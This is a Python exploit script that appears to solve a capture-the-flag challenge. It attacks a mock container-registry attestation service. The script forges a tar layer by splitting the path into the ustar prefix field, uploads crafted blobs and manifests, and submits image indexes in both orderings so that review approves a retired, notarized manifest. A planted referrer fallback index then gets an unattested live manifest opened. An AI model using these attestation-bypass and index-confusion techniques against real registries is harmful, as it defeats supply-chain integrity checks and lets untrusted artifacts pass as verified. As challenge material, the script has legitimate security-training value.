#!/usr/bin/env python3
import hashlib, json, subprocess, sys
FRONT="https://isfcrpesu-attestation.chals.io"
def curl(method, url, raw=None, ctype=None):
    cmd=["curl","-sk","-X",method,url]
    if raw is not None:
        open("/tmp/body.bin","wb").write(raw)
        cmd+=["-H",f"Content-Type: {ctype}","--data-binary","@/tmp/body.bin"]
    return subprocess.run(cmd,capture_output=True,text=True).stdout

# new session
sess=json.loads(subprocess.run(["curl","-sk","-H","Accept: application/json","-X","POST",FRONT+"/session"],capture_output=True,text=True).stdout)
BASE=sess["base"]
print(f"BASE {BASE}")
def GET(p): return curl("GET", BASE+p)
def POST(p,o):
    raw=json.dumps(o, separators=(',',':')).encode()
    return curl("POST", BASE+p, raw=raw, ctype="application/json")
def PUT_blob(d,raw,ctype): return curl("PUT", BASE+f"/v2/cryovault/blobs/{d}", raw=raw, ctype=ctype)
def PUT_manifest(ref,raw,ctype): return curl("PUT", BASE+f"/v2/cryovault/manifests/{ref}", raw=raw, ctype=ctype)

catalog=json.loads(GET("/catalog.json"))
policy=json.loads(GET("/policy.json"))
print("CATALOG",catalog)
print("POLICY",policy)
case=catalog["case"]
platform=catalog["platform"]
retired_digest=catalog["retired_manifest"]["digest"]
retired_size=catalog["retired_manifest"]["size"]
release_path=policy["live_layer"]["release_path"]
release_record=policy["live_layer"]["release_record"]
required_claim=policy["referrers"]["required_claim"]
claim_annotation=policy["referrers"]["claim_annotation"]
print(f"release_path {release_path} record {release_record} claim {required_claim} ann {claim_annotation}")

# notarize
notar=json.loads(POST("/api/notarize", {"digest":retired_digest}))
print("notarize",notar)
real_att=notar["attestation"]
ref_info=json.loads(GET(f"/v2/cryovault/referrers/{retired_digest}"))
real_size=[r["size"] for r in ref_info["referrers"] if r["digest"]==real_att][0]
print(f"real_att {real_att} size {real_size}")

# tar with prefix split for release_path
def make_header(name, size, prefix=b''):
    h=bytearray(512)
    def put(off,data): h[off:off+len(data)]=data
    put(0, name.encode() if isinstance(name,str) else name)
    put(100, b'0000644\x00')
    put(108, b'0000000\x00')
    put(116, b'0000000\x00')
    put(124, oct(size)[2:].encode().rjust(11,b'0')+b'\x00')
    put(136, b'00000000000\x00')
    put(148, b'        ')
    put(156, b'0')
    put(257, b'ustar\x00')
    put(263, b'00')
    put(345, prefix.encode() if isinstance(prefix,str) else prefix)
    put(148, oct(sum(h))[2:].encode().rjust(6,b'0')+b'\x00 ')
    return bytes(h)
def pad(d): return d+b'\x00'*((-len(d))%512)

# split release_path at last slash
if "/" in release_path:
    prefix, name = release_path.rsplit("/",1)
else:
    prefix, name = "", release_path
print(f"tar split prefix='{prefix}' name='{name}'")
release_content=json.dumps(release_record, separators=(',',':')).encode()
h1=make_header(name, len(release_content), prefix=prefix)
tar_bytes=h1+pad(release_content)+b'\x00'*1024
layer_digest="sha256:"+hashlib.sha256(tar_bytes).hexdigest()
layer_size=len(tar_bytes)
print("tar",layer_digest, PUT_blob(layer_digest, tar_bytes, "application/vnd.cryovault.layer.v1+tar"))

# evidence
ev_raw=json.dumps({"case":case,"custody":"live"}, separators=(',',':')).encode()
ev_digest="sha256:"+hashlib.sha256(ev_raw).hexdigest()
print("ev",ev_digest, PUT_blob(ev_digest, ev_raw, "application/vnd.cryovault.evidence.v1+json"))

# config
cfg_raw=json.dumps({"case":case,"evidence":ev_digest,"layer":layer_digest,"scope":"live"}, separators=(',',':')).encode()
cfg_digest="sha256:"+hashlib.sha256(cfg_raw).hexdigest()
print("cfg",cfg_digest, PUT_blob(cfg_digest, cfg_raw, "application/vnd.cryovault.config.v1+json"))

# manifest
manifest_obj={"schemaVersion":2,"mediaType":"application/vnd.oci.image.manifest.v1+json","artifactType":"application/vnd.cryovault.custody.v1+json","config":{"mediaType":"application/vnd.cryovault.config.v1+json","digest":cfg_digest,"size":len(cfg_raw)},"layers":[{"mediaType":"application/vnd.cryovault.evidence.v1+json","digest":ev_digest,"size":len(ev_raw)},{"mediaType":"application/vnd.cryovault.layer.v1+tar","digest":layer_digest,"size":layer_size}]}
manifest_raw=json.dumps(manifest_obj, separators=(',',':')).encode()
manifest_digest="sha256:"+hashlib.sha256(manifest_raw).hexdigest()
print("manifest",manifest_digest, PUT_manifest(manifest_digest, manifest_raw, "application/vnd.oci.image.manifest.v1+json"))

# try both orderings
def make_index(tag, first_digest, first_size, second_digest, second_size):
    idx={"schemaVersion":2,"mediaType":"application/vnd.oci.image.index.v1+json","manifests":[{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":first_digest,"size":first_size,"platform":{"os":platform["os"],"architecture":platform["architecture"]}},{"mediaType":"application/vnd.oci.image.manifest.v1+json","digest":second_digest,"size":second_size,"platform":{"os":platform["os"],"architecture":platform["architecture"]}}]}
    raw=json.dumps(idx, separators=(',',':')).encode()
    print(f"index {tag}:", PUT_manifest(tag, raw, "application/vnd.oci.image.index.v1+json"))
    rev_raw=POST("/api/review", {"reference":tag})
    print(f"review {tag}:", rev_raw)
    try:
        rev=json.loads(rev_raw)
        return raw, rev
    except:
        return raw, None

raw_lr, rev_lr = make_index("idx-lr", manifest_digest, len(manifest_raw), retired_digest, retired_size)
raw_rl, rev_rl = make_index("idx-rl", retired_digest, retired_size, manifest_digest, len(manifest_raw))

# pick successful
chosen=None
chosen_tag=None
chosen_rev=None
for tag, rev in [("idx-lr", rev_lr), ("idx-rl", rev_rl)]:
    if rev and "ticket" in rev:
        print(f"candidate {tag} succeeded review selected {rev['selected']}")
        # check selected is retired (should be)
        if rev["selected"]==retired_digest:
            chosen_tag=tag
            chosen_rev=rev
            print(f"choose {tag}")
            break

if not chosen_tag:
    print("no suitable index, abort")
    sys.exit(1)

# fallback for live
fallback={"schemaVersion":2,"mediaType":"application/vnd.oci.image.index.v1+json","manifests":[{"mediaType":"application/vnd.cryovault.notary.v1+json","digest":real_att,"size":real_size,"artifactType":"application/vnd.cryovault.notary.v1+json","annotations":{claim_annotation:required_claim}}]}
fb_raw=json.dumps(fallback, separators=(',',':')).encode()
print("fallback:", PUT_manifest(f"sha256-{manifest_digest.split(':')[1]}", fb_raw, "application/vnd.oci.image.index.v1+json"))

# open
print("OPEN:", POST("/api/open", {"reference":chosen_tag,"ticket":chosen_rev["ticket"]}))
